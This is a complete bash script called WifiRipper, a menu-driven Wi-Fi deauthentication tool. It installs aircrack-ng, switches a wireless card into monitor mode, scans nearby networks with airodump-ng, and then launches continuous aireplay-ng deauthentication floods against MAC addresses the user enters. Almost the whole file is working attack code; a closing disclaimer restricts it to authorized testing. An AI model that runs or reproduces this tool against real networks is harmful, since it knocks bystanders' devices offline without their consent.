#!/bin/bash
clear
if ! command -v aircrack-ng &> /dev/null; then
    echo "aircrack-ng is not installed. Installing..."
    apt-get update
    apt-get install -y aircrack-ng
    echo "aircrack-ng installed."
else
    echo "checking for aircrack-ng..."
    echo "aircrack-ng is already installed."
fi
clear
show_loading() {
  local duration="$1"
  local interval=0.2
  local symbols=("+" "*" "+" "*")
  local color=("\\e[92m" "\\e[92m" "\\e[92m" "\\e[92m")  

  for ((i = 0; i < duration * 5; i++)); do
    local symbol="${symbols[i % 4]}"
    local color="${colors[i % 4]}"
    echo -ne "${color}Loading... $symbol\\e[0m\r" 
    sleep "$interval"
  done
}
show_loading 5
echo "Loading complete!"
sleep 2
clear
animate_line() {
    local line="$1"
    local delay="$2"
    
    for ((i=0; i<${#line}; i++)); do
        echo -ne "${line:$i:1}"
        sleep "$delay"
    done
    echo
}

clear
delay=0.0005

animate_line " ─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── " $delay
animate_line " ─██████──────────██████─██████████─██████████████─██████████─████████████████───██████████─██████████████─██████████████─██████████████─████████████████─── " $delay
animate_line " ─██░░██──────────██░░██─██░░░░░░██─██░░░░░░░░░░██─██░░░░░░██─██░░░░░░░░░░░░██───██░░░░░░██─██░░░░░░░░░░██─██░░░░░░░░░░██─██░░░░░░░░░░██─██░░░░░░░░░░░░██─── " $delay
animate_line " ─██░░██──────────██░░██─████░░████─██░░██████████─████░░████─██░░████████░░██───████░░████─██░░██████░░██─██░░██████░░██─██░░██████████─██░░████████░░██─── " $delay
animate_line " ─██░░██──────────██░░██───██░░██───██░░██───────────██░░██───██░░██────██░░██─────██░░██───██░░██──██░░██─██░░██──██░░██─██░░██─────────██░░██────██░░██─── " $delay
animate_line " ─██░░██──██████──██░░██───██░░██───██░░██████████───██░░██───██░░████████░░██─────██░░██───██░░██████░░██─██░░██████░░██─██░░██████████─██░░████████░░██─── " $delay
animate_line " ─██░░██──██░░██──██░░██───██░░██───██░░░░░░░░░░██───██░░██───██░░░░░░░░░░░░██─────██░░██───██░░░░░░░░░░██─██░░░░░░░░░░██─██░░░░░░░░░░██─██░░░░░░░░░░░░██─── " $delay
animate_line " ─██░░██──██░░██──██░░██───██░░██───██░░██████████───██░░██───██░░██████░░████─────██░░██───██░░██████████─██░░██████████─██░░██████████─██░░██████░░████─── " $delay
animate_line " ─██░░██████░░██████░░██───██░░██───██░░██───────────██░░██───██░░██──██░░██───────██░░██───██░░██─────────██░░██─────────██░░██─────────██░░██──██░░██───── " $delay
animate_line " ─██░░░░░░░░░░░░░░░░░░██─████░░████─██░░██─────────████░░████─██░░██──██░░██████─████░░████─██░░██─────────██░░██─────────██░░██████████─██░░██──██░░██████─ " $delay
animate_line " ─██░░██████░░██████░░██─██░░░░░░██─██░░██─────────██░░░░░░██─██░░██──██░░░░░░██─██░░░░░░██─██░░██─────────██░░██─────────██░░░░░░░░░░██─██░░██──██░░░░░░██─ " $delay
animate_line " ─██████──██████──██████─██████████─██████─────────██████████─██████──██████████─██████████─██████─────────██████─────────██████████████─██████──██████████─ " $delay
animate_line " ─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── " $delay
animate_line "                                                                                                                                         v2.3.1               " $delay
animate_line "                                                     A Deauthentication tool By H3LLK1TTY                                                                 " $delay
sleep 5
echo " Please wait..."
function deauthenticate() {
    for mac in "${mac_addresses[@]}"; do
        gnome-terminal -- bash -c "aireplay-ng -0 $deauth_packets -a $mac -D $interface; read -p 'Press Enter to close this terminal window...' sudo airmon-ng stop $interface "
    done
    echo "Deauthentication completed for selected MAC addresses."
}

function scan_and_deauthenticate() {
    clear
    while true; do
        echo "Available wireless network interfaces:"
        echo "0 - Go Back"
        index=1
        for iface in $(ip link show | awk -F: '$0 !~ "lo|vir|^[^0-9]"{print $2;getline}'); do
            if [[ -n $(iwconfig $iface 2>/dev/null | grep "IEEE") ]]; then
                chipset_info=$(ethtool -i $iface | grep driver)
                chipset_name=$(echo $chipset_info | awk '{print $2}')
                manufacturer=$(echo $chipset_info | awk '{print $4}')
                echo "$index - $iface - $manufacturer $chipset_name"
                wireless_interfaces[$index]=$iface
                ((index++))
            fi
        done

        if [[ ${#wireless_interfaces[@]} -eq 0 ]]; then
            echo "No wireless interface detected"
            echo ":("
            sleep 3
            clear
        fi

        echo "Select a wireless interface:"
        read -p "(Enter a number or '0' to Go Back): " choice
        if [[ $choice -ge 0 && $choice -le ${#wireless_interfaces[@]} ]]; then
            if [[ $choice -eq 0 ]]; then
                clear
                return
            fi
            interface=${wireless_interfaces[$choice]}
            echo "Switching to monitor mode..."
            sudo ifconfig $interface down
            sudo airmon-ng start $interface
            new_interface="${interface}mon"
            if [[ -e /sys/class/net/$new_interface ]]; then
                interface=$new_interface
            fi
            sudo ifconfig $interface up
            echo "Monitor mode enabled on $interface"
            echo -e "Scanning for nearby Wi-Fi networks..."
            airodump-ng $interface

            while true; do
                read -p "Enter the number of MAC addresses to deauthenticate: " count
                if [[ $count =~ ^[0-9]+$ ]]; then
                    break
                else
                    echo "Invalid input. Please enter a number."
                fi
            done

            declare -a mac_addresses

            for ((i=1; i<=$count; i++)); do
                while true; do
                    read -p "Enter MAC address $i: " mac
                    if [[ $mac =~ ^([0-9A-Fa-f]{2}[:-]){5}([0-9A-Fa-f]{2})$ ]]; then
                        mac_addresses+=("$mac")
                        break
                    else
                        echo "Invalid MAC address. Please enter a valid MAC address."
                    fi
                done
            done

            while true; do
                read -p "Do you want to set a custom number of deauthentication packets (y/n): " custom_deauth
                case $custom_deauth in
                    [Yy]* )
                        read -p "Enter the custom number of deauthentication packets: " deauth_packets
                        if [[ $deauth_packets =~ ^[0-9]+$ ]]; then
                            break
                        else
                            echo "Invalid input. Please enter a number."
                        fi
                        ;;
                    [Nn]* )
                        deauth_packets=0
                        break ;;
                    * )
                        echo "Invalid response. Please enter 'y' or 'n'." ;;
                esac
            done            
            deauthenticate

            while true; do
                read -p "Do you want to Deauthenticate Again (y/n): " repeat
                case $repeat in
                    [Yy]* )
                        sudo airmon-ng stop $interface
                        clear
                        break ;;
                    [Nn]* )
                        sudo airmon-ng stop $interface
                        clear
                        return ;;
                    * )
                        echo "Invalid response. Please enter 'y' or 'n'." ;;
                esac
            done
        else
            echo "Invalid choice. Please enter a valid number."
        fi
    done
}

clear

while true; do
    echo "Main Menu:"
    echo "1 - Scan and Deauthenticate"
    echo "2 - Help"
    echo "3 - About Tool"
    echo "0 - Exit"
    read -p "Enter your choice: " main_choice

    case $main_choice in
        1 )
            scan_and_deauthenticate
            ;;
        2 ) clear
            echo "    Wi-Fi Interface Selection:
        The tool will display a list of available wireless interfaces on your system.
        Select the number corresponding to the desired wireless interface you want to use for scanning and deauthentication.

    Monitor Mode Activation:
        The script will switch the selected interface to monitor mode (if not already) using airmon-ng.
        If the interface name changes to wlan0mon (or similar), the script will automatically detect and use it.

    Scanning for Wi-Fi Networks:
        The tool will use airodump-ng to scan for nearby Wi-Fi networks.
        This will display a list of Wi-Fi networks, their BSSIDs (MAC addresses), and other information.

    Deauthentication Attack:
        You will be prompted to enter the number of MAC addresses you want to deauthenticate.
        For each MAC address, enter the MAC address of the client/device you want to deauthenticate from the target network.

    Custom Deauthentication Packets:
        You will be asked if you want to set a custom number of deauthentication packets or use the default (0).
        If you choose custom, enter the desired number of deauthentication packets to send.

    Deauthentication Process:
        The tool will start the deauthentication process using aireplay-ng for each provided MAC address.
        A new terminal window will open for each deauthentication attempt.
        Once deauthentication is complete, you can press Enter to close the terminal.

    Repeating the Process:
        After deauthenticating the selected MAC addresses, you will be asked if you want to deauthenticate again.
        If you choose "y," the tool will repeat the process for another round of deauthentication.

    Exiting the Tool:

    To exit the tool, choose "n" when prompted to repeat the deauthentication process.
    The script will stop monitor mode using airmon-ng and exit."
            ;;
        3 ) clear
            echo "Description:

WifiRipper is a powerful shell script designed to automate the process of scanning nearby Wi-Fi networks and performing deauthentication attacks on multiple networks. This script is intended for educational and testing purposes only and should be used responsibly and with proper authorization of network admins.

Features:

Interface Selection: The script allows the user to choose a wireless network interface from the available options on their system. This ensures that the user is targeting the correct wireless interface for network scanning and deauthentication.

Network Scanning: WifiRipper initiates network scanning using the popular tool airodump-ng, which captures information about nearby Wi-Fi networks. The script displays a list of available networks along with their details, including BSSID, SSID, channel, encryption type, and signal strength.

MAC Address Selection: After scanning, the user is prompted to enter the number of MAC addresses they want to target for deauthentication. The user can then provide the MAC addresses of the specific Wi-Fi networks they wish to deauthenticate.

Deauthentication Attack: WifiRipper launches multiple terminal windows, each executing the aireplay-ng command to perform deauthentication attacks on the selected MAC addresses. 
Deauthentication attacks are simulated disassociation packets sent to the target network's clients, causing temporary network disruption.

Repeat Option: Once the deauthentication attacks are completed, the user is given the option to repeat the process. This allows for continuous testing and monitoring of Wi-Fi network security.

Dependency Check: Wifiripper checks if the required tools (airodump-ng and aireplay-ng) are installed on the system. If not, it offers to install them using the package manager.

Disclaimer:

WifiRipper is intended for ethical and educational purposes only. Unauthorized use of this script to disrupt Wi-Fi networks without proper authorization is illegal and unethical. Users are encouraged to obtain the necessary permissions and follow ethical guidelines before using this script. The script authors and maintainers are not responsible for any misuse or harm caused by its usage."
            ;;    
        0 )
            clear
            echo "Exiting."
            echo "See you soon :)"
            exit ;;
        * )
            echo "Invalid choice. Please enter a valid number."
            ;;
    esac
done



